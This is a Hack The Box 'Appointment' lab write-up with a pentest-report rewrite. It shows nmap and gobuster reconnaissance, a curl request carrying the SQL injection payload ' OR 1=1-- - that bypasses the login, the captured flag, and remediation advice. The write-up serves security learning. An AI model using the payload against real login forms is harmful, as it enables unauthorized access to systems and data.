HTB Write-Up: Appointment
Target Information

IP Address: 10.129.66.197

Service Type: Web Application

Port: 80 (HTTP)

Authorization: Hack The Box lab

1. Initial Reconnaissance
Port & Service Scan
sudo nmap -A 10.129.66.197

Results
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 (Debian)


Observation

Only HTTP service exposed

No HTTPS

Apache 2.4.38 on Debian

Likely web-based vulnerability

2. Web Enumeration
Directory Brute-Force
sudo gobuster dir -u http://10.129.66.197 -w /usr/share/wordlists/dirb/common.txt

Discovered Paths
/index.php
/css/
/js/
/images/
/fonts/
/vendor/


Key Finding

index.php exists → likely login page

Presence of vendor/ suggests PHP framework usage

3. Login Page Analysis
Identify Input Fields
curl -s http://10.129.66.197/ | grep -i input

Found Parameters
name="username"
name="password"


Observation

Login form submits to /

No CSRF token

Likely server-side authentication logic vulnerable

4. SQL Injection Testing
Initial Failed Attempts
curl -X POST http://10.129.66.197/login.php ...


Returned 404 → login handled by root (/)

Successful SQL Injection Payload
curl -s -L -X POST http://10.129.66.197/ \
-d "username=' OR 1=1-- -&password=test"

Explanation

' OR 1=1-- -:

Breaks SQL query

Forces condition to always be true

Comments out password check

5. Successful Authentication Bypass
Server Response
<h3>Congratulations!</h3>
<h4>Your flag is: e3d0796d002a446c0e622226f42e9672</h4>

6. Flag
e3d0796d002a446c0e622226f42e9672

7. Conclusion (CTF)

The application is vulnerable to SQL Injection

Authentication can be bypassed without valid credentials

Flag disclosure achieved successfully

Lab completed

🔐 Pentest Report Version (Professional)
Executive Summary

A web application hosted at 10.129.66.197 was assessed. The application contains a critical SQL Injection vulnerability in its authentication mechanism, allowing unauthenticated users to bypass login controls and access protected content.

Scope

Target: 10.129.66.197

Protocol: HTTP

Port: 80

Testing Type: Web Application Security Assessment

Authorization: Hack The Box Lab Environment

Findings
Finding 1: SQL Injection in Authentication

Severity: Critical
OWASP: A03:2021 – Injection
CWE: CWE-89

Description

The login functionality fails to sanitize user-supplied input. An attacker can inject SQL logic into the username parameter to bypass authentication checks.

Proof of Concept
curl -X POST http://10.129.66.197/ \
-d "username=' OR 1=1-- -&password=test"

Impact

Authentication bypass

Unauthorized access

Full compromise of protected functionality

Potential data exfiltration

Evidence

Server returned a protected page containing sensitive data (flag), confirming successful exploitation.

Risk Rating

Critical

No authentication required

Exploitable remotely

No user interaction needed

Recommendations

Use prepared statements (parameterized queries)

Implement server-side input validation

Apply least-privilege DB accounts

Add WAF or SQLi detection rules

Perform regular security testing

Final Status

Application Compromised via SQL Injection